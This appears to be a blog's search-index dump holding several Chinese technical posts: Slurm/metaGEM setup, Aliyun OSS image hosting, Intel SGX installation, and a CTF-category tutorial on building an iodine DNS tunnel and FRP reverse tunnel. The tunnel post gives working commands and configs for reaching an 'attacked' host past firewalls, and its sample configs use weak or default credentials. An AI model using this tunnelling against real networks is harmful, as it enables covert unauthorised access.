bash [cxc.sh](http://cxc.sh/) 运行脚本，看看线程数是不是核心数的两倍，如果是就开启了，没有就没开启。 完成上面的之后吧对应的数字填写上去就可以了。 完成上述所有的设置之后就能启动服务了shell 12sudo systemctl enable slurmctld --nowsudo systemctl enable slurmd --now 查看slurm队列信息 1sinfo 如果这部分是 idle 就说明是可以的,如果不是 idle 请看这个 如果还是解决不了 比如是drain 其意思是用尽资源 解决文章 sinfo -R 报错Low socket***core***thre 那么直接把Sockets=2 CoresPerSocket=16 这两个参数减少，比如说除以2，留出一定的资源给系统使用，问题就解决了 确定目前队列里没有程序时，执行下列语句就好了（NodeName是上面设置的） 1scontrol update NodeName=m1 State=idle 至此就已经安装完成了 到这里配置slurm就已经结束了 5.提交后sbatch: error: Batch job submission failed: No partition specified or system default partition这个错误也是排查了好久，排查到这个文章 1234[username@master1 ~]# sbatch example.sh --partition computeq #Note that ordering matters here!sbatch: error: Batch job submission failed: No partition specified or system default partition[username@master1 ~]# sbatch --partition=computeq example.shSubmitted batch job 114499 猜测是运行顺序错误导致的问题，于是我们到metaGEM.sh 中排查一下，核心的运行语句如下 1echo &quot;nohup snakemake all -j $njobs -k --cluster-config ../config/cluster_config.json -c &#x27;sbatch -A &#123;cluster.account&#125; -t &#123;cluster.time&#125; --mem &#123;cluster.mem&#125; -n &#123;cluster.n&#125; --ntasks &#123;cluster.tasks&#125; --cpus-per-task &#123;cluster.n&#125; --output &#123;cluster.output&#125;&#x27; &amp;&quot;|bash; break;; 可以看到在后面的sbatch里面没有关于–partition的语句，于是我们手动添加，partition后面的名字就是前面我们设置的主机名 1--partition=你的主机名 1sbatch --partition=的主机名 -A &#123;cluster.account&#125; -t &#123;cluster.time&#125; --mem &#123;cluster.mem&#125; -n &#123;cluster.n&#125; --ntasks &#123;cluster.tasks&#125; --cpus-per-task &#123;cluster.n&#125; --output &#123;cluster.output&#125; 代码中搜索sbatch 有三个地方需要添加，添加后即可正常运行 然后我们运行文章开头的语句 -j 任务数量 -c 每个任务CPU数量 -m 每个任务分配的内存大小 -h 每个任务运行的时间 注:注意CPU过大也不行 1bash metaGEM.sh -t fastp -j 5 -c 4 -m 20 -h 20 然后我们输入squeue 查看刚才提交的任务 到这里我们的环境配置完毕","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"DNS隧道+FRP隧道搭建","slug":"DNS隧道-FRP隧道-847d738f19054a058e6cf5dbbfe97204","date":"2023-12-19T16:00:00.000Z","updated":"2024-02-06T18:23:00.453Z","comments":true,"path":"2023/12/20/DNS隧道-FRP隧道-847d738f19054a058e6cf5dbbfe97204/","link":"","permalink":"https://snowman12137.github.io/2023/12/20/DNS%E9%9A%A7%E9%81%93-FRP%E9%9A%A7%E9%81%93-847d738f19054a058e6cf5dbbfe97204/","excerpt":"","text":"DNS隧道+FRP隧道一、DNS隧道准备1.DNS隧道介绍DNS隧道，是隧道技术的一种。当我们HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试DNS隧道。DNS隧道很难防范，因为平时的业务等功能难免会用到DNS协议进行解析，所以防火墙大多对DNS流量是放行的状态。这时候，如果我们在不出机器构造一个恶意的域名，本地DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上，于是乎，我们的不出网主机就和恶意DNS服务器交流上了。 搭建DNS隧道的工具目前有iodine，dnscat，dns2tcp等。 我目前使用的是iodine工具去搭建。 2.前期准备1个域名、1个公网服务器 看别的博主使用了一个匿名域名申请网站http://www.freenom.com/zh/index.html，但是我没有申请成功过 于是我去阿里云https://dns.console.aliyun.com/买了付费的域名，正好还可以用在我的博客上。 先添加两条A记录，再添加一条NS记录 第一条A类记录www，告诉域名系统，”www.xiaowublog.top”的IP地址是”39.xxx.xxx.xxx“ 第二条A类记录@，告诉域名系统，”xiaowublog.top”的IP地址是”39.xxx.xxx.xxx“ 第三条NS记录，告诉域名系统，”ns.xiaowublog.top”的域名由”www.xiaowublog.top”进行解析。 到此前期准备工作就已经完成了，已经将域名绑定到了我们的公网服务器上。 (虽然提示10分钟到72小时之内解析完成。但实际上几分钟部分DNS服务器就会刷新好，10分钟左右就会部署完毕，如果点击生效检测没有解析到预定的结果，那么就是配置出了问题) 正常的ns.xxx.xx解析结果应该是如下的 二、iodine DNS隧道搭建在我们的公网服务器安装iodine，该工具服务端为iodined，客户端为iodine。 执行apt install iodine命令会同时安装服务端与客户端。 1.服务端先进入服务器的安全组，一定一定要打开UDP的53端口 在公网服务器上部署iodine服务端。(需要root权限运行) iodined -f -c -P 123.com 192.168.50.1 ns.xiaowublog.top -DD -f：在前台运行 -c：禁止检查所有传入请求的客户端IP地址。 -P：客户端和服务端之间用于验证身份的密码。 -D：指定调试级别，-DD指第二级。“D”的数量随级别增加。 这里的192.168.50.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突注意！填写的地址为NS记录 执行完该命令之后会新生成一个dns0虚拟网卡，ip地址就是刚才命令中输入的ip地址(192.168.50.1)。 DNS默认使用53UDP端口进行转发，所以如果53端口被占用需要kill掉。 2.客户端(被攻击端)客户端我使用的是kali iodine -f -P 123.com ns.xiaowublog.top -M 200 -O base64 (-m 128 我的代码运行时会出现分片错误，所以指定分片大小，可加可不加，若大小选择不合适会导致丢包率极大，传输效率变小) r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道 M：指定上行主机的大小。 m：调节最大下行分片的大小。 f：在前台运行 T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。 O：指定数据编码规范。 P：客户端和服务端之间用于验证身份的密码。 L：指定是否开启懒惰模式，默认开启。 I：指定两个请求之间的时间间隔。 正常运行应该是这样 下图是服务端运行截图，可以看到编码还是有错误的 可以看到kali客户端的网卡也创建成功 ping 192.168.50.2 可以看到在服务器上ping客户端的dns0新网卡可以ping通 现在就相当于公网服务器与kali之间生成了一个虚拟网卡，这两个虚拟网卡之间是互通的。 在公网服务器上连接kali的虚拟地址，使用ssh做一个动态端口转发。 ssh -D 60688 root@192.168.50.2 但此时只相当于在公网服务器的192.168.50.1的60688端口搭建了一个socks5代理隧道，如果想要本地使用该隧道是行不通的，因为192.168.50.1相当于一个内网地址，是不能直接访问得到的，所以需要将公网服务器虚拟网卡地址192.168.50.1的60688端口数据转发到公网服务器公网地址的一个端口上。这个端口转发我还没试(不知道采用哪个工具会好点)。 这里使用FRP搭建反向隧道 3.FRP搭建隧道下载FRP对应的版本，因为FRP在0.50以后更新，语法与操作和之前的版本很不一样，因此咨询了一个大佬新版本的使用方法，下面链接时FRP的下载地址。 https://github.com/fatedier/frp/releases/tag/v0.52.3 下面是下载后的目录结构 frps是服务端的执行文件，对应的frps.tonl是服务端的配置文件。 相应的frpc是服务端的执行文件，对应的frpc.tonl是服务端的配置文件。 服务端配置 配置文件frps.tonl 123serverAddr = &quot;192.168.50.1&quot;serverPort = 7000 1frps -c frps.tonl 客户端配置 配置文件frpc.tonl(tcp链接) 12345678serverAddr = &quot;192.168.50.2&quot;serverPort = 7000[[proxies]]name = &quot;kali-ssh&quot;type = &quot;tcp&quot;localIP = &quot;127.0.0.1&quot;localPort = 22remotePort = 6000 执行命令 1frpc -c frpc.tonl 可以看到客户端有一条新的连接命令 连接命令 1ssh -o --Port=6000 root@192.168.50.2 我们开启一个新虚拟机通过连接服务端的FRP直接连接到kali上，成功连接。 此外附上所有的frpc.toml配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360# your proxy name will be changed to &#123;user&#125;.&#123;proxy&#125;user = &quot;your_name&quot;# A literal address or host name for IPv6 must be enclosed# in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;# For single serverAddr field, no need square brackets, like serverAddr = &quot;::&quot;.serverAddr = &quot;0.0.0.0&quot;serverPort = 7000# STUN server to help penetrate NAT hole.# natHoleStunServer = &quot;stun.easyvoip.com:3478&quot;# Decide if exit program when first login failed, otherwise continuous relogin to frps# default is trueloginFailExit = true# console or real logFile path like ./frpc.loglog.to = &quot;./frpc.log&quot;# trace, debug, info, warn, errorlog.level = &quot;info&quot;log.maxDays = 3# disable log colors when log.to is console, default is falselog.disablePrintColor = falseauth.method = &quot;token&quot;# auth.additionalScopes specifies additional scopes to include authentication information.# Optional values are HeartBeats, NewWorkConns.# auth.additionalScopes = [&quot;HeartBeats&quot;, &quot;NewWorkConns&quot;]# auth tokenauth.token = &quot;12345678&quot;# oidc.clientID specifies the client ID to use to get a token in OIDC authentication.# auth.oidc.clientID = &quot;&quot;# oidc.clientSecret specifies the client secret to use to get a token in OIDC authentication.# auth.oidc.clientSecret = &quot;&quot;# oidc.audience specifies the audience of the token in OIDC authentication.# auth.oidc.audience = &quot;&quot;# oidc_scope specifies the permisssions of the token in OIDC authentication if AuthenticationMethod == &quot;oidc&quot;. By default, this value is &quot;&quot;.# auth.oidc.scope = &quot;&quot;# oidc.tokenEndpointURL specifies the URL which implements OIDC Token Endpoint.# It will be used to get an OIDC token.# auth.oidc.tokenEndpointURL = &quot;&quot;# oidc.additionalEndpointParams specifies additional parameters to be sent to the OIDC Token Endpoint.# For example, if you want to specify the &quot;audience&quot; parameter, you can set as follow.# frp will add &quot;audience=&lt;value&gt;&quot; &quot;var1=&lt;value&gt;&quot; to the additional parameters.# auth.oidc.additionalEndpointParams.audience = &quot;https://dev.auth.com/api/v2/&quot;# auth.oidc.additionalEndpointParams.var1 = &quot;foobar&quot;# Set admin address for control frpc&#x27;s action by http api such as reloadwebServer.addr = &quot;127.0.0.1&quot;webServer.port = 7400webServer.user = &quot;admin&quot;webServer.password = &quot;admin&quot;# Admin assets directory. By default, these assets are bundled with frpc.# webServer.assetsDir = &quot;./static&quot;# Enable golang pprof handlers in admin listener.webServer.pprofEnable = false# The maximum amount of time a dial to server will wait for a connect to complete. Default value is 10 seconds.# transport.dialServerTimeout = 10# dialServerKeepalive specifies the interval between keep-alive probes for an active network connection between frpc and frps.# If negative, keep-alive probes are disabled.# transport.dialServerKeepalive = 7200# connections will be established in advance, default value is zerotransport.poolCount = 5# If tcp stream multiplexing is used, default is true, it must be same with frps# transport.tcpMux = true# Specify keep alive interval for tcp mux.# only valid if tcpMux is enabled.# transport.tcpMuxKeepaliveInterval = 60# Communication protocol used to connect to server# supports tcp, kcp, quic, websocket and wss now, default is tcptransport.protocol = &quot;tcp&quot;# set client binding ip when connect server, default is empty.# only when protocol = tcp or websocket, the value will be used.transport.connectServerLocalIP = &quot;0.0.0.0&quot;# if you want to connect frps by http proxy or socks5 proxy or ntlm proxy, you can set proxyURL here or in global environment variables# it only works when protocol is tcp# transport.proxyURL = &quot;http://user:passwd@192.168.1.128:8080&quot;# transport.proxyURL = &quot;socks5://user:passwd@192.168.1.128:1080&quot;# transport.proxyURL = &quot;ntlm://user:passwd@192.168.1.128:2080&quot;# quic protocol options# transport.quic.keepalivePeriod = 10# transport.quic.maxIdleTimeout = 30# transport.quic.maxIncomingStreams = 100000# If tls.enable is true, frpc will connect frps by tls.# Since v0.50.0, the default value has been changed to true, and tls is enabled by default.transport.tls.enable = true# transport.tls.certFile = &quot;client.crt&quot;# transport.tls.keyFile = &quot;client.key&quot;# transport.tls.trustedCaFile = &quot;ca.crt&quot;# transport.tls.serverName = &quot;example.com&quot;# If the disableCustomTLSFirstByte is set to false, frpc will establish a connection with frps using the# first custom byte when tls is enabled.# Since v0.50.0, the default value has been changed to true, and the first custom byte is disabled by default.# transport.tls.disableCustomTLSFirstByte = true# Heartbeat configure, it&#x27;s not recommended to modify the default value.# The default value of heartbeat_interval is 10 and heartbeat_timeout is 90. Set negative value# to disable it.# transport.heartbeatInterval = 30# transport.heartbeatTimeout = 90# Specify a dns server, so frpc will use this instead of default one# dnsServer = &quot;8.8.8.8&quot;# Proxy names you want to start.# Default is empty, means all proxies.# start = [&quot;ssh&quot;, &quot;dns&quot;]# Specify udp packet size, unit is byte. If not set, the default value is 1500.# This parameter should be same between client and server.# It affects the udp and sudp proxy.udpPacketSize = 1500# Additional metadatas for client.metadatas.var1 = &quot;abc&quot;metadatas.var2 = &quot;123&quot;# Include other config files for proxies.# includes = [&quot;./confd/*.ini&quot;][[proxies]]# &#x27;ssh&#x27; is the unique proxy name# If global user is not empty, it will be changed to &#123;user&#125;.&#123;proxy&#125; such as &#x27;your_name.ssh&#x27;name = &quot;ssh&quot;type = &quot;tcp&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# Limit bandwidth for this proxy, unit is KB and MBtransport.bandwidthLimit = &quot;1MB&quot;# Where to limit bandwidth, can be &#x27;client&#x27; or &#x27;server&#x27;, default is &#x27;client&#x27;transport.bandwidthLimitMode = &quot;client&quot;# If true, traffic of this proxy will be encrypted, default is falsetransport.useEncryption = false# If true, traffic will be compressedtransport.useCompression = false# Remote port listen by frpsremotePort = 6001# frps will load balancing connections for proxies in same grouploadBalancer.group = &quot;test_group&quot;# group should have same group keyloadBalancer.groupKey = &quot;123456&quot;# Enable health check for the backend service, it supports &#x27;tcp&#x27; and &#x27;http&#x27; now.# frpc will connect local service&#x27;s port to detect it&#x27;s healthy statushealthCheck.type = &quot;tcp&quot;# Health check connection timeouthealthCheck.timeoutSeconds = 3# If continuous failed in 3 times, the proxy will be removed from frpshealthCheck.maxFailed = 3# every 10 seconds will do a health checkhealthCheck.intervalSeconds = 10# additional meta info for each proxymetadatas.var1 = &quot;abc&quot;metadatas.var2 = &quot;123&quot;[[proxies]]name = &quot;ssh_random&quot;type = &quot;tcp&quot;localIP = &quot;192.168.31.100&quot;localPort = 22# If remote_port is 0, frps will assign a random port for youremotePort = 0[[proxies]]name = &quot;dns&quot;type = &quot;udp&quot;localIP = &quot;114.114.114.114&quot;localPort = 53remotePort = 6002# Resolve your domain names to [server_addr] so you can use http://web01.yourdomain.com to browse web01 and http://web02.yourdomain.com to browse web02[[proxies]]name = &quot;web01&quot;type = &quot;http&quot;localIP = &quot;127.0.0.1&quot;localPort = 80# http username and password are safety certification for http protocol# if not set, you can access this custom_domains without certificationhttpUser = &quot;admin&quot;httpPassword = &quot;admin&quot;# if domain for frps is frps.com, then you can access [web01] proxy by URL http://web01.frps.comsubdomain = &quot;web01&quot;customDomains = [&quot;web01.yourdomain.com&quot;]# locations is only available for http typelocations = [&quot;/&quot;, &quot;/pic&quot;]# route requests to this service if http basic auto user is abc# route_by_http_user = abchostHeaderRewrite = &quot;example.com&quot;# params with prefix &quot;header_&quot; will be used to update http request headersrequestHeaders.set.x-from-where = &quot;frp&quot;healthCheck.type = &quot;http&quot;# frpc will send a GET http request &#x27;/status&#x27; to local http service# http service is alive when it return 2xx http response codehealthCheck.path = &quot;/status&quot;healthCheck.intervalSeconds = 10healthCheck.maxFailed = 3healthCheck.timeoutSeconds = 3[[proxies]]name = &quot;web02&quot;type = &quot;https&quot;localIP = &quot;127.0.0.1&quot;localPort = 8000subdomain = &quot;web02&quot;customDomains = [&quot;web02.yourdomain.com&quot;]# if not empty, frpc will use proxy protocol to transfer connection info to your local service# v1 or v2 or emptytransport.proxyProtocolVersion = &quot;v2&quot;[[proxies]]name = &quot;tcpmuxhttpconnect&quot;type = &quot;tcpmux&quot;multiplexer = &quot;httpconnect&quot;localIP = &quot;127.0.0.1&quot;localPort = 10701customDomains = [&quot;tunnel1&quot;]# routeByHTTPUser = &quot;user1&quot;[[proxies]]name = &quot;plugin_unix_domain_socket&quot;type = &quot;tcp&quot;remotePort = 6003# if plugin is defined, local_ip and local_port is useless# plugin will handle connections got from frps[proxies.plugin]type = &quot;unix_domain_socket&quot;unixPath = &quot;/var/run/docker.sock&quot;[[proxies]]name = &quot;plugin_http_proxy&quot;type = &quot;tcp&quot;remotePort = 6004[proxies.plugin]type = &quot;http_proxy&quot;httpUser = &quot;abc&quot;httpPassword = &quot;abc&quot;[[proxies]]name = &quot;plugin_socks5&quot;type = &quot;tcp&quot;remotePort = 6005[proxies.plugin]type = &quot;socks5&quot;username = &quot;abc&quot;password = &quot;abc&quot;[[proxies]]name = &quot;plugin_static_file&quot;type = &quot;tcp&quot;remotePort = 6006[proxies.plugin]type = &quot;static_file&quot;localPath = &quot;/var/www/blog&quot;stripPrefix = &quot;static&quot;httpUser = &quot;abc&quot;httpPassword = &quot;abc&quot;[[proxies]]name = &quot;plugin_https2http&quot;type = &quot;https&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;https2http&quot;localAddr = &quot;127.0.0.1:80&quot;crtPath = &quot;./server.crt&quot;keyPath = &quot;./server.key&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;plugin_https2https&quot;type = &quot;https&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;https2https&quot;localAddr = &quot;127.0.0.1:443&quot;crtPath = &quot;./server.crt&quot;keyPath = &quot;./server.key&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;plugin_http2https&quot;type = &quot;http&quot;customDomains = [&quot;test.yourdomain.com&quot;][proxies.plugin]type = &quot;http2https&quot;localAddr = &quot;127.0.0.1:443&quot;hostHeaderRewrite = &quot;127.0.0.1&quot;requestHeaders.set.x-from-where = &quot;frp&quot;[[proxies]]name = &quot;secret_tcp&quot;# If the type is secret tcp, remote_port is useless# Who want to connect local port should deploy another frpc with stcp proxy and role is visitortype = &quot;stcp&quot;# secretKey is used for authentication for visitorssecretKey = &quot;abcdefg&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# If not empty, only visitors from specified users can connect.# Otherwise, visitors from same user can connect. &#x27;*&#x27; means allow all users.allowUsers = [&quot;*&quot;][[proxies]]name = &quot;p2p_tcp&quot;type = &quot;xtcp&quot;secretKey = &quot;abcdefg&quot;localIP = &quot;127.0.0.1&quot;localPort = 22# If not empty, only visitors from specified users can connect.# Otherwise, visitors from same user can connect. &#x27;*&#x27; means allow all users.allowUsers = [&quot;user1&quot;, &quot;user2&quot;]# frpc role visitor -&gt; frps -&gt; frpc role server[[visitors]]name = &quot;secret_tcp_visitor&quot;type = &quot;stcp&quot;# the server name you want to visitorserverName = &quot;secret_tcp&quot;secretKey = &quot;abcdefg&quot;# connect this address to visitor stcp serverbindAddr = &quot;127.0.0.1&quot;# bindPort can be less than 0, it means don&#x27;t bind to the port and only receive connections redirected from# other visitors. (This is not supported for SUDP now)bindPort = 9000[[visitors]]name = &quot;p2p_tcp_visitor&quot;type = &quot;xtcp&quot;# if the server user is not set, it defaults to the current userserverUser = &quot;user1&quot;serverName = &quot;p2p_tcp&quot;secretKey = &quot;abcdefg&quot;bindAddr = &quot;127.0.0.1&quot;# bindPort can be less than 0, it means don&#x27;t bind to the port and only receive connections redirected from# other visitors. (This is not supported for SUDP now)bindPort = 9001# when automatic tunnel persistence is required, set it to truekeepTunnelOpen = false# effective when keep_tunnel_open is set to true, the number of attempts to punch through per hourmaxRetriesAnHour = 8minRetryInterval = 90# fallbackTo = &quot;stcp_visitor&quot;# fallbackTimeoutMs = 500","categories":[{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/categories/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"CTF网络攻防","slug":"CTF网络攻防","permalink":"https://snowman12137.github.io/tags/CTF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"}],"author":"Sn0wma1n"},{"title":"解决Gitee图床不显示问题(使用阿里云OSS搭建图床)","slug":"解决Gitee图床不显示问题","date":"2023-09-02T08:51:50.000Z","updated":"2024-02-03T17:05:10.725Z","comments":true,"path":"2023/09/02/解决Gitee图床不显示问题/","link":"","permalink":"https://snowman12137.github.io/2023/09/02/%E8%A7%A3%E5%86%B3Gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/","excerpt":"","text":"问题前段时间搞博客弄了一个Gitee图床，图片可以上传成功，外部链接可以打开图片，但是hexo s后本地都打开不了图片，但是相应的源码标签里依然有图片链接地址。这就让我很疑惑。 报错是class=lazyload error 可以看到下图这里是有图片的，就是不能显示。 在网上并没有找到相关的报错解释，然后我又查找了lazyload是懒加载，但是也没有查明相关的报错解决方法，于是我又怀疑是主题的问题。 在_config.yml里注释掉theme以后发现报错 错误是不能加载，有可能是Gitee的权限问题(是公共库)，导致服务器不能访问库里面的图片。 然后我找到了这样一篇文章： gitee图床不能用了，心态崩了 原来是Gitee从去年开始已经不支持图床了。然后发现阿里云是比较好用的一个图床，毕竟是付费的(40G 1年 9RMB) 搭建阿里云OSS图床+PicGO1.购买阿里云OSS服务 登录阿里云 打开侧边栏选择对象存储OSS 进入管理控制台 点击创建Bucket 有的人在区域一栏没有买过流量包，会提醒购买 读写权限注意是公共读，博客需要读取你上传后的图片 购买资源包 2.添加用户权限我们需要添加一个可以操作OSS的用户，在配置好PicGO后使用这个用户对图片进行自动添加。 点击访问控制 点击用户，新建用户 输入名称，注意勾选OpenAPI调用访问 这里要记下AccessKey ID 和 AccessKeySecret，之后配置PICGO用到，因为这个界面关掉之后就不好找了，所以最好 记在记事本里 设置用户权限 选择管理对象存储OSS服务权限，点击确定，如下图所示： 3.配置PICGO 下载PICGO里面有相应操作系统的安装包文件以及源码，点击下载安装文件即可。 安装完成后，打开图床设置，点击阿里云OSS，得到如下界面 注意设定keyid，就是创建用户的AccessKey ID，KeySecret 就是AccessKeySecret，存储空间名就是创建Bucket的名字，存储区域也是创建时设定的， 忘记的可以通过Bucket概览查看，如下图所示： 存储路径默认设置img&#x2F;即可，如果自己有已经备案的域名，可以填写设定自定义域名，如果没有不填即可。 可以看到PICGO能够文件上传，也支持剪贴板上传。上传过程为： 拖拽文件或点击上传文件或点击剪贴板图片上传。 上传完成后电脑剪贴板里就有了所选链接格式的图片链接。 到相应的地方粘贴即可。 开始可能有疑问，我的图片存到哪里了呢？很简单，点击文件管理，如下图所示： 看到img文件夹了吗？就在里面了，你可以在文件夹里对图片进行删除等操作。 4.配置Typora 打开typora点击偏好设置 然后配置如下选项 1.点击图像 2.选择上传图片 3.上传服务选择PICGO 4.找到PICGO安装的位置，即PicGo.exe的位置 点击验证图片上传选项即可 注意可以1.右键桌面图标 2.点击属性 3.负值路径 Over 下课","categories":[{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"}],"author":"Sn0wma1n"},{"title":"SGX(Software Guard eXtensions)_linux构建可信执行环境(一)","slug":"SGX-Software-Guard-eXtensions-构建可信执行环境-一","date":"2023-09-02T08:42:16.000Z","updated":"2023-09-06T09:55:34.893Z","comments":true,"path":"2023/09/02/SGX-Software-Guard-eXtensions-构建可信执行环境-一/","link":"","permalink":"https://snowman12137.github.io/2023/09/02/SGX-Software-Guard-eXtensions-%E6%9E%84%E5%BB%BA%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83-%E4%B8%80/","excerpt":"","text":"SGX(Software Guard eXtensions)_linux构建可信执行环境(一)：如何开发第一个最简单的 SGX 应用 HelloWorld一、了解SGX1.1SGX定义 Intel 软件防护扩展SGX（Software Guard Extension）是一项针对台式机和服务器平台的旨在满足可信计算需求的技术。Intel SGX是Intel架构新的扩展，在原有架构上增加了一组新的指令集和内存访问机制。 Intel在2015年从第6代Intel酷睿处理器平台开始引入了Intel软件防护扩展新指令集，使用特殊指令和软件可将应用程序代码放入一个enclave中执行。Enclave可以提供一个隔离的可信执行环境，可以在BIOS、虚拟机监控器、主操作系统和驱动程序均被恶意代码攻陷的情况下，仍对enclave内的代码和内存数据提供保护，防止恶意软件影响enclave内的代码和数据，从而保障用户的关键代码和数据的机密性和完整性。 1.2基本原理 SGX应用由两部分组成： untrusted 不可信区：代码和数据运行在普通非加密内存区域，程序main入口必须在非可信区。 trusted 可信区：代码和数据运行在硬件加密内存区域，此区域由CPU创建的且只有CPU有权限访问。 当一个安全区域函数被调用时，只有安全区域内的代码才能看到其数据，外部访问总是被拒绝；返回时，安全区数据将保留在受保护的内存中。 非可信区只能通过ECALL函数调用可信区内的函数，可信区只能通过OCALL函数调用非可信区的函数，ECALL函数和OCALL函数通过EDL文件声明。 1.3两大机制1.3.1保护机制针对enclave的保护机制主要包括两个部分：一是enclave内存访问语义的变化，二是应用程序地址映射关系的保护。这两项功能共同完成对enclave的机密性和完整性的保护。 1.3.2 认证机制SGX 提出了两种类型的身份认证方式：一种是平台内部 enclave 间的认证，用来认证进行报告的 enclave 和自己是否运行在同一个平台上；另一种是平台间的远程认证，用于远程的认证者认证 enclave 的身份信息。 本地证明：同一平台的两个Enclave之间的证明过程。 远程证明：Enclave和不在平台上的第三方之间的证明过程。 二、Linux下安装SGX 简介：我们需要安装几个东西。第一是驱动Drive，有了驱动才可以调用intel芯片里面的硬件部分。第二个是PSW(平台软件)，其是允许支持SGX的应用程序在目标平台上执行的软件栈，包含四部分1.提供对硬件功能进行访问的驱动程序；2.为执行和认证提供多个支持库；3.运行所必需的架构型enclave；4.加载并与enclave进行通信的服务；。第三个是软件开发工具包（SDK）为开发人员提供了开发支持SGX的应用程序所需的一切，它由一个生成应用程序和enclave之间的接口函数的工具，一个在使用它之前对enclave进行签名的工具，一个调试它的工具以及一个性能检查的工具组成。另外，它还包含模板和样本参数，用于在Windows下使用Visual Studio开发enclave，或在Linux下使用Makefile。 有了这三样东西我们才可以进行代码开发 以Ubuntu20.04 LTS为例 硬件需求仅当安装sgx驱动和PSW时需要，安装sgx sdk并不需要硬件支持。 硬件不支持的情况下，可以在模拟环境下编写测试SGX程序，其中makefile里SGX_MODE&#x3D;SIM。（虽然 SGX是基于硬件的，但是依旧可以使用软件条件进行模拟） 先安装驱动、PSW、SDK所需依赖 123sudo apt-get updatesudo apt-get install libssl-dev libcurl4-openssl-dev libprotobuf-devsudo apt-get install build-essential python 下载Intel SGX驱动并安装 注意所有版本的驱动、SPW、SDK都在这里https://download.01.org/intel-sgx/sgx-linux/2.21/distro/ 1234wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/sgx_linux_x64_driver_2.6.0_4f5bb63.binchmod +x sgx_linux_x64_driver_2.6.0_4f5bb63.binsudo ./sgx_linux_x64_driver_2.6.0_4f5bb63.binsudo reboot 注意安装完重启才生效 下载Intel SGX PSW并安装 注意：有的版本的没有PSW文件，也可以不装 12wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/libsgx-enclave-common_2.7.101.3-bionic1_amd64.debsudo dpkg -i ./libsgx-enclave-common_2.7.101.3-bionic1_amd64.deb 下载并安装Intel SGX SDK 安装过程中可以手动输入SDK要安装到的目标位置 123wget https://download.01.org/intel-sgx/sgx-linux/2.7.1/distro/ubuntu18.04-server/sgx_linux_x64_sdk_2.7.101.3.binchmod +x ./sgx_linux_x64_sdk_2.7.101.3.bin./sgx_linux_x64_sdk_2.7.101.3.bin 添加环境变量，执行上一步结束时输出的命令 1source /path/to/sgxsdk/environment 接下来进入到sgxsdk&#x2F;SampleCode&#x2F;SampleEnclave文件夹里 1cd /path/to/sgxsdk/SampleCode/SampleEnclave 编辑一下Makefile 12345678# Intel SGX SDK 的安装位置SGX_SDK ?= /home/luoyhang003/SGX/sgxsdk# 运行类型：HW 真实环境；SIM 模拟器环境SGX_MODE ?= SIM# 运行架构：仅支持 64 位SGX_ARCH ?= x64# 是否为：Debug 调试模式SGX_DEBUG ?= 1 退出然后运行示例 1234# 编译sudo make# 运行./app 注意一定要添加环境变量source &#x2F;path&#x2F;to&#x2F;sgxsdk&#x2F;environment，这行命令是临时环境变量，即存活时间为一个终端的市场，一旦重启或开启新的终端环境变量即会失效，需要手动添加。也可以永久化环境变量。 成功运行截图 三、文件结构与代码目录结构 编译&amp;运行 1234567891011121314151617181920212223242526272829303132$ makeGEN =&gt; App/Enclave_u.hCC &lt;= App/Enclave_u.cCXX &lt;= App/App.cppLINK =&gt; appGEN =&gt; Enclave/Enclave_t.hCC &lt;= Enclave/Enclave_t.cCXX &lt;= Enclave/Enclave.cppLINK =&gt; enclave.so&lt;EnclaveConfiguration&gt; &lt;ProdID&gt;0&lt;/ProdID&gt; &lt;ISVSVN&gt;0&lt;/ISVSVN&gt; 